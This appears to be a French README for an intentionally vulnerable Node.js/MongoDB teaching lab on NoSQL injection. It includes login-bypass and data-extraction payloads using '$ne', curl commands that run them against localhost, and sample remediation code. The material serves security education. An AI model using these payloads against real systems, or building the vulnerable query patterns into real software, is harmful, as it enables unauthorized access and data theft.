# 🚨 Projet de Sécurité Web - Injection NoSQL

## 📋 Description
Ce projet démontre les vulnérabilités d'injection NoSQL dans une application web Node.js/MongoDB et présente les techniques de remédiation appropriées.

## ⚠️ Avertissement
**Ce projet contient volontairement des vulnérabilités de sécurité à des fins éducatives uniquement. Ne jamais déployer en production.**

## 🎯 Objectifs Pédagogiques
- Comprendre les mécanismes d'injection NoSQL
- Apprendre à identifier ces vulnérabilités
- Maîtriser les techniques de remédiation
- Pratiquer l'exploitation éthique

## 🏗️ Architecture
- **Backend:** Node.js + Express
- **Base de données:** MongoDB
- **Frontend:** EJS + JavaScript vanilla
- **Conteneurisation:** Docker + Docker Compose

## 🚀 Installation et Démarrage

### Prérequis
- Docker
- Docker Compose

### Démarrage rapide
```bash
# Cloner le projet
git clone <repository-url>
cd SecuWebProjet

# Démarrer avec Docker
docker-compose up --build

# Accéder à l'application
# http://localhost:3000
```

## 👥 Comptes de Test
| Username | Password | Rôle |
|----------|----------|------|
| admin | admin123 | admin |
| user1 | password123 | user |
| user2 | secret456 | user |

## 🔓 Vulnérabilités Démontrées

### 1. Injection NoSQL - Authentification
**Endpoint vulnérable:** `POST /login-vulnerable`

**Problème:** Les paramètres utilisateur sont directement injectés dans la requête MongoDB sans validation.

**Exploitation:**
```json
{
  "username": {"$ne": ""},
  "password": {"$ne": ""}
}
```

### 2. Injection NoSQL - Recherche
**Endpoint vulnérable:** `POST /search-vulnerable`

**Problème:** Exécution de requêtes MongoDB arbitraires via le paramètre `query`.

**Exploitation:**
```json
{
  "query": {"username": {"$ne": ""}}
}
```

## 🛡️ Techniques de Remédiation

### 1. Validation des Types
```javascript
if (typeof username !== 'string' || typeof password !== 'string') {
  return res.json({ success: false, message: 'Format invalide' });
}
```

### 2. Sanitisation
```javascript
username = username.replace(/[$.]/g, '');
```

### 3. Hachage Sécurisé
```javascript
const hashedPassword = await bcrypt.hash(password, 10);
const isValid = await bcrypt.compare(password, user.password);
```

### 4. Requêtes Contrôlées
```javascript
const users = await User.find({
  $or: [
    { username: { $regex: searchTerm, $options: 'i' } },
    { email: { $regex: searchTerm, $options: 'i' } }
  ]
}).select('username email');
```

## 📊 Comparaison Vulnérable vs Sécurisé

| Aspect | Vulnérable | Sécurisé |
|--------|------------|----------|
| Validation | ❌ Aucune | ✅ Types + Format |
| Sanitisation | ❌ Aucune | ✅ Caractères spéciaux |
| Mots de passe | ❌ Texte brut | ✅ Hachage bcrypt |
| Requêtes | ❌ Dynamiques | ✅ Paramétrées |

## 🧪 Tests d'Exploitation

### Interface Web
1. Accédez à `http://localhost:3000`
2. Cliquez sur "Page d'Exploitation"
3. Testez les payloads fournis

### Tests Manuels avec curl

**Login bypass:**
```bash
curl -X POST http://localhost:3000/login-vulnerable \
  -H "Content-Type: application/json" \
  -d '{"username": {"$ne": ""}, "password": {"$ne": ""}}'
```

**Extraction de données:**
```bash
curl -X POST http://localhost:3000/search-vulnerable \
  -H "Content-Type: application/json" \
  -d '{"query": {"username": {"$ne": ""}}}'
```

## 📚 Ressources Pédagogiques

### Opérateurs MongoDB Dangereux
- `$ne` - Not equal
- `$gt` / `$lt` - Greater/Less than
- `$regex` - Expression régulière
- `$where` - JavaScript code execution
- `$or` / `$and` - Opérateurs logiques

### OWASP NoSQL Injection
- [OWASP NoSQL Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection)

## 🔧 Structure du Projet
```
SecuWebProjet/
├── app.js              # Application principale
├── package.json        # Dépendances Node.js
├── Dockerfile         # Image Docker
├── docker-compose.yml # Orchestration
├── README.md          # Documentation
└── views/             # Templates EJS
    ├── index.ejs      # Page d'accueil
    └── exploit.ejs    # Page d'exploitation
```

## 🎓 Points Clés à Retenir
1. **Jamais de confiance aveugle** dans les données utilisateur
2. **Validation stricte** des types et formats
3. **Sanitisation** des caractères spéciaux
4. **Hachage sécurisé** des mots de passe
5. **Principe du moindre privilège** pour les requêtes

## 📝 Évaluation
Ce projet permet d'évaluer :
- Compréhension des vulnérabilités NoSQL
- Capacité à exploiter ces failles
- Maîtrise des techniques de remédiation
- Bonnes pratiques de sécurité

---
**⚠️ Rappel de Sécurité:** Utilisez ces connaissances de manière éthique et responsable.
